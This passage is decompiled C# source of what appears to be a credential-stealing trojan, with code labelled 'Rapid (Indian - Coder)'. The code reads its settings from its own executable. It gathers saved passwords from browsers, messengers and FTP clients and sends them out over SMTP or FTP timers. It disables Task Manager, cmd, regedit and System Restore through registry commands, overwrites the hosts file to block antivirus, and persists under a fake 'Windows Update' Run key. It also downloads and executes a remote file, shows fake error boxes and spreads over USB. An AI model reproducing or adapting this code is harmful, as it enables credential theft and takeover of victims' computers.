						goto IL_071f;
						IL_071f:
						num = 83;
						FileSystem.FileGet(1, ref string_43, -1L, false);
						goto IL_0738;
						IL_0738:
						num = 84;
						FileSystem.FileGet(1, ref string_8, -1L, false);
						goto IL_0751;
						IL_0751:
						num = 85;
						FileSystem.FileGet(1, ref string_44, -1L, false);
						goto IL_076a;
						IL_076a:
						num = 86;
						FileSystem.FileGet(1, ref string_25, -1L, false);
						goto IL_0783;
						IL_0783:
						num = 87;
						FileSystem.FileGet(1, ref string_26, -1L, false);
						goto IL_079c;
						IL_079c:
						num = 88;
						FileSystem.FileGet(1, ref string_27, -1L, false);
						goto IL_07b5;
						IL_07b5:
						num = 89;
						FileSystem.FileGet(1, ref string_28, -1L, false);
						goto IL_07ce;
						IL_07ce:
						num = 90;
						FileSystem.FileGet(1, ref string_29, -1L, false);
						goto IL_07e7;
						IL_07e7:
						num = 91;
						FileSystem.FileGet(1, ref string_30, -1L, false);
						goto IL_0800;
						IL_0800:
						num = 92;
						FileSystem.FileGet(1, ref string_31, -1L, false);
						goto IL_0819;
						IL_0819:
						num = 93;
						FileSystem.FileGet(1, ref string_32, -1L, false);
						goto IL_0832;
						IL_0832:
						num = 94;
						FileSystem.FileClose(new int[1] { 1 });
						goto IL_0846;
						IL_0846:
						num = 95;
						bytes = Class34.smethod_91(Application.get_ExecutablePath());
						goto IL_0854;
						IL_0854:
						num = 96;
						@string = Encoding.Default.GetString(bytes);
						goto IL_0864;
						IL_0864:
						num = 97;
						array = Strings.Split(@string, "@Rapid@", -1, (CompareMethod)0);
						goto IL_0877;
						IL_0877:
						num = 98;
						vmethod_4().set_Text(array[1]);
						goto IL_0889;
						IL_0889:
						num = 99;
						vmethod_2().set_Text(array[2]);
						goto IL_089b;
						IL_089b:
						num = 100;
						vmethod_0().set_Text(array[3]);
						goto IL_08ad;
						IL_08ad:
						num = 101;
						vmethod_8().set_Text(array[4]);
						goto IL_08bf;
						IL_08bf:
						num = 102;
						vmethod_10().set_Text(array[5]);
						goto IL_08d1;
						IL_08d1:
						num = 103;
						vmethod_12().set_Text(array[6]);
						goto IL_08e3;
						IL_08e3:
						num = 104;
						vmethod_14().set_Text(array[7]);
						goto IL_08f5;
						IL_08f5:
						num = 105;
						vmethod_16().set_Text(array[8]);
						goto IL_0907;
						IL_0907:
						num = 106;
						vmethod_20().set_Text(array[9]);
						goto IL_091a;
						IL_091a:
						num = 107;
						if (Conversions.ToBoolean(array[10]))
						{
							goto IL_092c;
						}
						goto IL_09ad;
						IL_092c:
						num = 108;
						vmethod_18().set_Text("encrypion-Ys");
						goto IL_093f;
						IL_093f:
						num = 109;
						vmethod_4().set_Text(Class34.smethod_106(vmethod_4().get_Text(), string_37));
						goto IL_0963;
						IL_0963:
						num = 110;
						vmethod_2().set_Text(Class34.smethod_106(vmethod_2().get_Text(), string_37));
						goto IL_0987;
						IL_0987:
						num = 111;
						vmethod_0().set_Text(Class34.smethod_106(vmethod_0().get_Text(), string_37));
						goto IL_09c3;
						IL_09ad:
						num = 113;
						goto IL_09b0;
						IL_09b0:
						num = 114;
						vmethod_18().set_Text("encrypion-no");
						goto IL_09c3;
						IL_09c3:
						num = 116;
						if (Conversions.ToBoolean(array[11]))
						{
							goto IL_09d5;
						}
						goto IL_0abe;
						IL_09d5:
						num = 117;
						vmethod_22().set_Text("anties-Ys");
						goto IL_09e8;
						IL_09e8:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_09ef;
						IL_09ef:
						num = 119;
						Class34.smethod_83(this);
						goto IL_09f8;
						IL_09f8:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_09ff;
						IL_09ff:
						num = 121;
						Class34.smethod_2(this);
						goto IL_0a08;
						IL_0a08:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0a0f;
						IL_0a0f:
						num = 123;
						Class34.smethod_82(this);
						goto IL_0a18;
						IL_0a18:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0a1f;
						IL_0a1f:
						num = 125;
						Class34.smethod_107(this);
						goto IL_0a28;
						IL_0a28:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0a2f;
						IL_0a2f:
						num = 127;
						Class34.smethod_128(this);
						goto IL_0a38;
						IL_0a38:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0a3f;
						IL_0a3f:
						num = 129;
						Class34.smethod_138(this);
						goto IL_0a4b;
						IL_0a4b:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0a52;
						IL_0a52:
						num = 131;
						Class34.smethod_52(this);
						goto IL_0a5e;
						IL_0a5e:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0a65;
						IL_0a65:
						num = 133;
						Class34.smethod_130(this);
						goto IL_0a71;
						IL_0a71:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0a78;
						IL_0a78:
						num = 135;
						Class34.smethod_31(this);
						goto IL_0a84;
						IL_0a84:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0a8b;
						IL_0a8b:
						num = 137;
						Class34.smethod_19(this);
						goto IL_0a97;
						IL_0a97:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0a9e;
						IL_0a9e:
						num = 139;
						Class34.smethod_84(this);
						goto IL_0aaa;
						IL_0aaa:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0ab1;
						IL_0ab1:
						num = 141;
						Class34.smethod_118();
						goto IL_0ada;
						IL_0abe:
						num = 143;
						goto IL_0ac4;
						IL_0ac4:
						num = 144;
						vmethod_22().set_Text("anties-no");
						goto IL_0ada;
						IL_0ada:
						num = 146;
						if (Conversions.ToBoolean(array[12]))
						{
							goto IL_0aec;
						}
						goto IL_0b04;
						IL_0aec:
						num = 147;
						vmethod_24().set_Text("Rd-Ys");
						goto IL_0b20;
						IL_0b04:
						num = 149;
						goto IL_0b0a;
						IL_0b0a:
						num = 150;
						vmethod_24().set_Text("Rd-no");
						goto IL_0b20;
						IL_0b20:
						num = 152;
						vmethod_26().set_Text(array[13]);
						goto IL_0b36;
						IL_0b36:
						num = 153;
						vmethod_28().set_Text(array[14]);
						goto IL_0b4c;
						IL_0b4c:
						num = 154;
						if (Conversions.ToBoolean(array[15]))
						{
							goto IL_0b5e;
						}
						goto IL_0bb8;
						IL_0b5e:
						num = 155;
						vmethod_30().set_Text("Fake-Ys");
						goto IL_0b74;
						IL_0b74:
						num = 156;
						vmethod_32().set_Text(array[16]);
						goto IL_0b8a;
						IL_0b8a:
						num = 157;
						vmethod_34().set_Text(array[17]);
						goto IL_0ba0;
						IL_0ba0:
						num = 158;
						vmethod_36().set_Text(array[18]);
						goto IL_0bd4;
						IL_0bb8:
						num = 160;
						goto IL_0bbe;
						IL_0bbe:
						num = 161;
						vmethod_30().set_Text("Fake-no");
						goto IL_0bd4;
						IL_0bd4:
						num = 163;
						if (Conversions.ToBoolean(array[19]))
						{
							goto IL_0be6;
						}
						goto IL_0bfe;
						IL_0be6:
						num = 164;
						vmethod_40().set_Text("usb-Ys");
						goto IL_0c1a;
						IL_0bfe:
						num = 166;
						goto IL_0c04;
						IL_0c04:
						num = 167;
						vmethod_40().set_Text("usb-no");
						goto IL_0c1a;
						IL_0c1a:
						num = 169;
						if (Conversions.ToBoolean(array[20]))
						{
							goto IL_0c2c;
						}
						goto IL_0c44;
						IL_0c2c:
						num = 170;
						vmethod_42().set_Text("p2p-Ys");
						goto IL_0c60;
						IL_0c44:
						num = 172;
						goto IL_0c4a;
						IL_0c4a:
						num = 173;
						vmethod_42().set_Text("p2p-no");
						goto IL_0c60;
						IL_0c60:
						num = 175;
						if (Conversions.ToBoolean(array[21]))
						{
							goto IL_0c72;
						}
						goto IL_0c8a;
						IL_0c72:
						num = 176;
						vmethod_44().set_Text("screenlogger-Ys");
						goto IL_0ca6;
						IL_0c8a:
						num = 178;
						goto IL_0c90;
						IL_0c90:
						num = 179;
						vmethod_44().set_Text("screenlogger-no");
						goto IL_0ca6;
						IL_0ca6:
						num = 181;
						if (Conversions.ToBoolean(array[22]))
						{
							goto IL_0cbb;
						}
						goto IL_0e2b;
						IL_0cbb:
						num = 182;
						vmethod_46().set_Text("stealers-Ys");
						goto IL_0cd1;
						IL_0cd1:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0cd8;
						IL_0cd8:
						num = 184;
						Class34.smethod_153();
						goto IL_0ce3;
						IL_0ce3:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0cea;
						IL_0cea:
						num = 186;
						Class34.smethod_74(this);
						goto IL_0cf6;
						IL_0cf6:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0cfd;
						IL_0cfd:
						num = 188;
						Class34.smethod_88(this);
						goto IL_0d0a;
						IL_0d0a:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0d11;
						IL_0d11:
						num = 190;
						Class34.smethod_36(this);
						goto IL_0d1d;
						IL_0d1d:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0d24;
						IL_0d24:
						num = 192;
						Class34.smethod_71(this);
						goto IL_0d30;
						IL_0d30:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0d37;
						IL_0d37:
						num = 194;
						Class34.smethod_63(this);
						goto IL_0d43;
						IL_0d43:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0d4a;
						IL_0d4a:
						num = 196;
						Class34.smethod_144(this);
						goto IL_0d56;
						IL_0d56:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0d5d;
						IL_0d5d:
						num = 198;
						Class34.smethod_67(this);
						goto IL_0d69;
						IL_0d69:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0d70;
						IL_0d70:
						num = 200;
						Class34.smethod_30(this);
						goto IL_0d7d;
						IL_0d7d:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0d84;
						IL_0d84:
						num = 202;
						Class34.smethod_133(this);
						goto IL_0d91;
						IL_0d91:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0d98;
						IL_0d98:
						num = 204;
						vmethod_90().set_Text(Class34.smethod_4());
						goto IL_0dae;
						IL_0dae:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0db5;
						IL_0db5:
						num = 206;
						Class34.smethod_60(this);
						goto IL_0dc1;
						IL_0dc1:
						num = 207;
						vmethod_92().set_Text(string_53);
						goto IL_0dd8;
						IL_0dd8:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0ddf;
						IL_0ddf:
						num = 209;
						Class34.smethod_161(this);
						goto IL_0deb;
						IL_0deb:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0df2;
						IL_0df2:
						num = 211;
						Class34.smethod_69(this);
						goto IL_0dfe;
						IL_0dfe:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0e05;
						IL_0e05:
						num = 213;
						Class34.smethod_3(this);
						goto IL_0e11;
						IL_0e11:
						num = 214;
						Class34.smethod_21(this);
						goto IL_0e1d;
						IL_0e1d:
						num = 215;
						Class34.smethod_40(this);
						goto IL_0e47;
						IL_0e2b:
						num = 217;
						goto IL_0e31;
						IL_0e31:
						num = 218;
						vmethod_46().set_Text("stealers-no");
						goto IL_0e47;
						IL_0e47:
						num = 220;
						if (Conversions.ToBoolean(array[23]))
						{
							goto IL_0e59;
						}
						goto IL_0e71;
						IL_0e59:
						num = 221;
						vmethod_64().set_Text("av_blocker-Ys");
						goto IL_0e8d;
						IL_0e71:
						num = 223;
						goto IL_0e77;
						IL_0e77:
						num = 224;
						vmethod_64().set_Text("av_blocker-no");
						goto IL_0e8d;
						IL_0e8d:
						num = 226;
						if (Conversions.ToBoolean(array[24]))
						{
							goto IL_0e9f;
						}
						goto IL_0ec8;
						IL_0e9f:
						num = 227;
						vmethod_66().set_Text("clipboardlogger-Ys");
						goto IL_0eb5;
						IL_0eb5:
						num = 228;
						vmethod_78().Start();
						goto IL_0ee4;
						IL_0ec8:
						num = 230;
						goto IL_0ece;
						IL_0ece:
						num = 231;
						vmethod_66().set_Text("clipboardlogger-no");
						goto IL_0ee4;
						IL_0ee4:
						num = 233;
						if (Conversions.ToBoolean(array[25]))
						{
							goto IL_0ef6;
						}
						goto IL_0f4b;
						IL_0ef6:
						num = 234;
						vmethod_68().set_Text("delete coockies-Ys");
						goto IL_0f0c;
						IL_0f0c:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0f13;
						IL_0f13:
						num = 236;
						Class34.smethod_113(bool_0: true, this, bool_1: true);
						goto IL_0f21;
						IL_0f21:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0f28;
						IL_0f28:
						num = 238;
						Class34.smethod_162(this, bool_0: true);
						goto IL_0f35;
						IL_0f35:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0f3c;
						IL_0f3c:
						num = 240;
						Class34.smethod_95(bool_0: true, this);
						goto IL_0f67;
						IL_0f4b:
						num = 242;
						goto IL_0f51;
						IL_0f51:
						num = 243;
						vmethod_68().set_Text("delete coockies-no");
						goto IL_0f67;
						IL_0f67:
						num = 245;
						if (Conversions.ToBoolean(array[26]))
						{
							goto IL_0f79;
						}
						goto IL_0fac;
						IL_0f79:
						num = 246;
						vmethod_50().set_Text("fuck run-Ys");
						goto IL_0f8f;
						IL_0f8f:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0f96;
						IL_0f96:
						num = 248;
						Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoRun /t REG_DWORD /d 1 /f", (AppWinStyle)0, false, -1);
						goto IL_0fc8;
						IL_0fac:
						num = 250;
						goto IL_0fb2;
						IL_0fb2:
						num = 251;
						vmethod_50().set_Text("fuck run-no");
						goto IL_0fc8;
						IL_0fc8:
						num = 253;
						if (Conversions.ToBoolean(array[27]))
						{
							goto IL_0fda;
						}
						goto IL_0ff2;
						IL_0fda:
						num = 254;
						vmethod_52().set_Text("fuck taskbar-Ys");
						goto IL_100e;
						IL_0ff2:
						num = 256;
						goto IL_0ff8;
						IL_0ff8:
						num = 257;
						vmethod_52().set_Text("fuck taskbar-no");
						goto IL_100e;
						IL_100e:
						num = 259;
						if (Conversions.ToBoolean(array[28]))
						{
							goto IL_1020;
						}
						goto IL_1053;
						IL_1020:
						num = 260;
						vmethod_54().set_Text("fuck cmd-Ys");
						goto IL_1036;
						IL_1036:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_103d;
						IL_103d:
						num = 262;
						Interaction.Shell("REG add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 1 /f", (AppWinStyle)0, false, -1);
						goto IL_106f;
						IL_1053:
						num = 264;
						goto IL_1059;
						IL_1059:
						num = 265;
						vmethod_54().set_Text("fuck cmd-no");
						goto IL_106f;
						IL_106f:
						num = 267;
						if (Conversions.ToBoolean(array[29]))
						{
							goto IL_1081;
						}
						goto IL_10b4;
						IL_1081:
						num = 268;
						vmethod_56().set_Text("fuck reg-Ys");
						goto IL_1097;
						IL_1097:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_109e;
						IL_109e:
						num = 270;
						Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f", (AppWinStyle)0, false, -1);
						goto IL_10d0;
						IL_10b4:
						num = 272;
						goto IL_10ba;
						IL_10ba:
						num = 273;
						vmethod_56().set_Text("fuck reg-no");
						goto IL_10d0;
						IL_10d0:
						num = 275;
						if (Conversions.ToBoolean(array[30]))
						{
							goto IL_10e2;
						}
						goto IL_1115;
						IL_10e2:
						num = 276;
						vmethod_58().set_Text("fuck rightclick-Ys");
						goto IL_10f8;
						IL_10f8:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_10ff;
						IL_10ff:
						num = 278;
						Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoViewContextMenu /t REG_DWORD /d 1 /f", (AppWinStyle)0, false, -1);
						goto IL_1131;
						IL_1115:
						num = 280;
						goto IL_111b;
						IL_111b:
						num = 281;
						vmethod_58().set_Text("fuck rightclick-no");
						goto IL_1131;
						IL_1131:
						num = 283;
						if (Conversions.ToBoolean(array[31]))
						{
							goto IL_1143;
						}
						goto IL_1176;
						IL_1143:
						num = 284;
						vmethod_60().set_Text("fuck fInfo-Ys");
						goto IL_1159;
						IL_1159:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_1160;
						IL_1160:
						num = 286;
						Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoFolderInfo /t REG_DWORD /d 1 /f", (AppWinStyle)0, false, -1);
						goto IL_1192;
						IL_1176:
						num = 288;
						goto IL_117c;
						IL_117c:
						num = 289;
						vmethod_60().set_Text("fuck fInfo-no");
						goto IL_1192;
						IL_1192:
						num = 291;
						if (Conversions.ToBoolean(array[32]))
						{
							goto IL_11a4;
						}
						goto IL_11d7;
						IL_11a4:
						num = 292;
						vmethod_62().set_Text("fuck taskmngr-Ys");
						goto IL_11ba;
						IL_11ba:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_11c1;
						IL_11c1:
						num = 294;
						Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", (AppWinStyle)0, false, -1);
						goto IL_11f3;
						IL_11d7:
						num = 296;
						goto IL_11dd;
						IL_11dd:
						num = 297;
						vmethod_62().set_Text("fuck taskmngr-no");
						goto IL_11f3;
						IL_11f3:
						num = 299;
						if (Conversions.ToBoolean(array[33]))
						{
							goto IL_1205;
						}
						goto IL_1238;
						IL_1205:
						num = 300;
						vmethod_70().set_Text("fuck cpanel-Ys");
						goto IL_121b;
						IL_121b:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_1222;
						IL_1222:
						num = 302;
						Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f", (AppWinStyle)0, false, -1);
						goto IL_1254;
						IL_1238:
						num = 304;
						goto IL_123e;
						IL_123e:
						num = 305;
						vmethod_70().set_Text("fuck cpanel-no");
						goto IL_1254;
						IL_1254:
						num = 307;
						if (Conversions.ToBoolean(array[34]))
						{
							goto IL_1266;
						}
						goto IL_12aa;
						IL_1266:
						num = 308;
						vmethod_72().set_Text("fuck sysrestore-Ys");
						goto IL_127c;
						IL_127c:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_1283;
						IL_1283:
						num = 310;
						((ServerComputer)Class1.smethod_0()).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object)"1", RegistryValueKind.DWord);
						goto IL_12c6;
						IL_12aa:
						num = 312;
						goto IL_12b0;
						IL_12b0:
						num = 313;
						vmethod_72().set_Text("fuck sysrestore-no");
						goto IL_12c6;
						IL_12c6:
						num = 315;
						string_43 = array[35];
						goto IL_12d7;
						IL_12d7:
						num = 316;
						vmethod_82().set_Text(string_43);
						goto IL_12ee;
						IL_12ee:
						num = 317;
						if (Conversions.ToBoolean(array[36]))
						{
							goto IL_1303;
						}
						goto IL_13f3;
						IL_1303:
						num = 318;
						vmethod_38().set_Text("startup-Ys");
						goto IL_1319;
						IL_1319:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_1320;
						IL_1320:
						num = 320;
						folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Templates);
						goto IL_132f;
						IL_132f:
						num = 321;
						if (File.Exists(folderPath + "\\" + vmethod_82().get_Text() + ".exe"))
						{
							goto IL_1358;
						}
						goto IL_1389;
						IL_1358:
						num = 322;
						((ServerComputer)Class1.smethod_0()).get_FileSystem().DeleteFile(folderPath + "\\" + vmethod_82().get_Text() + ".exe");
						goto IL_1389;
						IL_1389:
						num = 324;
						File.Copy(Application.get_ExecutablePath(), folderPath + "\\" + vmethod_82().get_Text() + ".exe");
						goto IL_13b5;
						IL_13b5:
						num = 325;
						((ServerComputer)Class1.smethod_0()).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Windows Update", (object)(folderPath + "\\" + vmethod_82().get_Text() + ".exe"), RegistryValueKind.String);
						goto IL_140f;
						IL_13f3:
						num = 327;
						goto IL_13f9;
						IL_13f9:
						num = 328;
						vmethod_38().set_Text("startup-no");
						goto IL_140f;
						IL_140f:
						num = 330;
						vmethod_84().set_Text(array[37]);
						goto IL_1425;
						IL_1425:
						num = 331;
						if (Operators.CompareString(vmethod_64().get_Text(), "av_blocker-Ys", false) == 0)
						{
							goto IL_1444;
						}
						goto IL_14bb;
						IL_1444:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_144b;
						IL_144b:
						num = 333;
						path = string_45 + "\\drivers\\etc\\\\hosts";
						goto IL_1463;
						IL_1463:
						num = 334;
						streamWriter = new StreamWriter(path);
						goto IL_1472;
						IL_1472:
						num = 335;
						streamWriter.Write("# + -----Created By Rapid (Indian - Coder ) --------- +");
						goto IL_1484;
						IL_1484:
						num = 336;
						streamWriter.Write(Environment.NewLine);
						goto IL_1496;
						IL_1496:
						num = 337;
						streamWriter.Write(vmethod_84().get_Text());
						goto IL_14ae;
						IL_14ae:
						num = 338;
						streamWriter.Dispose();
						goto IL_14bb;
						IL_14bb:
						num = 340;
						if (Operators.CompareString(vmethod_40().get_Text(), "usb-Ys", false) != 0)
						{
						}
						goto IL_14da;
						IL_14da:
						num = 342;
						string_62 = "[Stealers] " + string_61 + string_61 + "FireFox Passwords" + string_61 + string_61 + vmethod_86().get_Text() + string_61 + string_61 + "Internet Explorer Passwords" + string_61 + string_53 + string_61 + string_61 + "Google Chrome Passwords" + string_61 + vmethod_88().get_Text() + string_61 + string_61 + "Msn Messenger Passwords" + string_61 + string_54 + string_61 + string_55 + string_61 + string_61 + "[--------- Paltalk Scene  ----------]" + string_61 + string_48 + string_61 + string_61 + " [--------- Pidgin ----------]  " + string_61 + string_51 + string_61 + string_61 + "" + string_61 + string_50 + string_61 + string_61 + "" + string_61 + string_49 + string_61 + string_61 + "FileZilla" + string_61 + string_52 + string_61 + string_61 + "DynDn" + string_61 + string_47 + string_61 + string_61 + "SmartFTP" + string_61 + Class34.smethod_30(this) + string_61 + string_61 + "Core FTP" + string_61 + Class34.smethod_133(this) + string_61 + string_61 + "Internet Download Manager" + string_61 + string_61 + string_59 + string_61 + string_61;
						goto IL_1801;
						IL_1801:
						num = 343;
						vmethod_102().set_Text(string_62);
						goto IL_1818;
						IL_1818:
						num = 344;
						vmethod_76().Start();
						goto IL_1829;
						IL_1829:
						num = 345;
						Class34.smethod_43(this);
						goto IL_1835;
						IL_1835:
						num = 346;
						if (Operators.CompareString(vmethod_10().get_Text(), "smtp", false) == 0)
						{
							goto IL_1857;
						}
						goto IL_18e3;
						IL_1857:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_185e;
						IL_185e:
						num = 348;
						Class34.smethod_41(this);
						goto IL_186a;
						IL_186a:
						num = 349;
						vmethod_80().set_Interval((int)Math.Round(Conversions.ToDouble(vmethod_8().get_Text()) * 60000.0));
						goto IL_189b;
						IL_189b:
						num = 350;
						vmethod_8().set_Text(Conversions.ToString(vmethod_80().get_Interval()));
						goto IL_18bc;
						IL_18bc:
						num = 351;
						vmethod_80().Start();
						goto IL_18cd;
						IL_18cd:
						num = 352;
						vmethod_118().set_Text("Timer 3 --------- Smtp started");
						goto IL_18e3;
						IL_18e3:
						num = 354;
						if (Operators.CompareString(vmethod_10().get_Text(), "ftp", false) == 0)
						{
							goto IL_1905;
						}
						goto IL_199d;
						IL_1905:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_190c;
						IL_190c:
						num = 356;
						Class34.smethod_41(this);
						goto IL_1918;
						IL_1918:
						num = 357;
						Class34.smethod_15(this);
						goto IL_1924;
						IL_1924:
						num = 358;
						vmethod_108().set_Interval((int)Math.Round(Conversions.ToDouble(vmethod_8().get_Text()) * 60000.0));
						goto IL_1955;
						IL_1955:
						num = 359;
						vmethod_8().set_Text(Conversions.ToString(vmethod_108().get_Interval()));
						goto IL_1976;
						IL_1976:
						num = 360;
						vmethod_108().Start();
						goto IL_1987;
						IL_1987:
						num = 361;
						vmethod_118().set_Text("Timer 5 : Ftp started");
						goto IL_199d;
						IL_199d:
						num = 363;
						if (Conversions.ToBoolean(array[38]))
						{
							goto IL_19b2;
						}
						goto IL_1a8d;
						IL_19b2:
						num = 364;
						vmethod_132().set_Text("Logsfucker-Ys");
						goto IL_19c8;
						IL_19c8:
						num = 365;
						vmethod_134().set_Text(array[39]);
						goto IL_19de;
						IL_19de:
						num = 366;
						webClient = new WebClient();
						goto IL_19eb;
						IL_19eb:
						num = 367;
						text = webClient.DownloadString(vmethod_134().get_Text()).Trim();
						goto IL_1a0a;
						IL_1a0a:
						num = 368;
						vmethod_136().set_Text(text);
						goto IL_1a1d;
						IL_1a1d:
						num = 369;
						if (Operators.CompareString(vmethod_138().get_Text(), vmethod_136().get_Text(), false) == 0)
						{
							goto IL_1a42;
						}
						goto IL_1aa9;
						IL_1a42:
						num = 370;
						vmethod_76().Stop();
						goto IL_1a53;
						IL_1a53:
						num = 371;
						vmethod_80().Stop();
						goto IL_1a64;
						IL_1a64:
						num = 372;
						vmethod_108().Stop();
						goto IL_1a75;
						IL_1a75:
						num = 373;
						vmethod_6().set_Text("");
						goto IL_1aa9;
						IL_1a8d:
						num = 376;
						goto IL_1a93;
						IL_1a93:
						num = 377;
						vmethod_132().set_Text("logsfucker-no");
						goto IL_1aa9;
						IL_1aa9:
						num = 379;
						if (Operators.CompareString(vmethod_24().get_Text(), "Rd-Ys", false) == 0)
						{
							goto IL_1acb;
						}
						goto IL_1b7b;
						IL_1acb:
						num = 380;
						if (File.Exists(string_45 + "\\" + vmethod_28().get_Text()))
						{
							goto IL_1af3;
						}
						goto IL_1b19;
						IL_1af3:
						num = 381;
						File.Delete(string_45 + "\\" + vmethod_28().get_Text());
						goto IL_1b19;
						IL_1b19:
						num = 383;
						((ServerComputer)Class1.smethod_0()).get_Network().DownloadFile(vmethod_26().get_Text(), string_45 + "\\" + vmethod_28().get_Text());
						goto IL_1b54;
						IL_1b54:
						num = 384;
						Process.Start(string_45 + "\\" + vmethod_28().get_Text());
						goto IL_1b7b;
						IL_1b7b:
						num = 386;
						if (Operators.CompareString(vmethod_30().get_Text(), "Fake-Ys", false) == 0)
						{
							goto IL_1b9d;
						}
						goto IL_1cc0;
						IL_1b9d:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_1ba4;
						IL_1ba4:
						num = 388;
						if (Operators.CompareString(vmethod_36().get_Text(), "error", false) == 0)
						{
							goto IL_1bc3;
						}
						goto IL_1bed;
						IL_1bc3:
						num = 389;
						MessageBox.Show(vmethod_34().get_Text(), vmethod_32().get_Text(), (MessageBoxButtons)2, (MessageBoxIcon)16);
						goto IL_1cc0;
						IL_1bed:
						num = 391;
						if (Operators.CompareString(vmethod_36().get_Text(), "asterisk", false) == 0)
						{
							goto IL_1c0c;
						}
						goto IL_1c36;
						IL_1c0c:
						num = 392;
						MessageBox.Show(vmethod_34().get_Text(), vmethod_32().get_Text(), (MessageBoxButtons)2, (MessageBoxIcon)64);
						goto IL_1cc0;
						IL_1c36:
						num = 394;
						if (Operators.CompareString(vmethod_36().get_Text(), "warning", false) == 0)
						{
							goto IL_1c55;
						}
						goto IL_1c7c;
						IL_1c55:
						num = 395;
						MessageBox.Show(vmethod_34().get_Text(), vmethod_32().get_Text(), (MessageBoxButtons)2, (MessageBoxIcon)48);
						goto IL_1cc0;
						IL_1c7c:
						num = 397;
						if (Operators.CompareString(vmethod_36().get_Text(), "question", false) == 0)
						{
							goto IL_1c9b;
						}
						goto IL_1cc0;
						IL_1c9b:
						num = 398;
						MessageBox.Show(vmethod_34().get_Text(), vmethod_32().get_Text(), (MessageBoxButtons)2, (MessageBoxIcon)32);
						goto IL_1cc0;
						IL_1cc0:
						num = 401;
						if (Conversions.ToBoolean(array[40]))
						{
							goto IL_1cd2;
						}
						goto IL_1cfd;
						IL_1cd2:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_1cd9;
						IL_1cd9:
						num = 403;
						Class34.smethod_150(this);
						goto IL_1ce5;
						IL_1ce5:
						num = 404;
						vmethod_140().set_Text("usb yes");
						goto IL_1d19;
						IL_1cfd:
						num = 406;
						goto IL_1d03;
						IL_1d03:
						num = 407;
						vmethod_140().set_Text("usb no");
						goto IL_1d19;
						IL_1d19:
						num = 409;
						if (Conversions.ToBoolean(array[41]))
						{
							goto IL_1d2b;
						}
						goto IL_1d55;
						IL_1d2b:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_1d32;
						IL_1d32:
						num = 411;
						Class34.smethod_87();
						goto IL_1d3d;
						IL_1d3d:
						num = 412;
						vmethod_142().set_Text("yahoo yes");
						goto IL_1d71;
						IL_1d55:
						num = 414;
						goto IL_1d5b;
						IL_1d5b:
						num = 415;
						vmethod_142().set_Text("yahoo no ");
						goto IL_1d71;
						IL_1d71:
						num = 417;
						if (Conversions.ToBoolean(array[42]))
						{
							goto IL_1d83;
						}
						goto IL_1dd5;
						IL_1d83:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_1d8a;
						IL_1d8a:
						num = 419;
						Class34.smethod_80();
						goto IL_1d95;
						IL_1d95:
						num = 420;
						text2 = "C:\\Program Settings";
						text3 = "Program Settings";
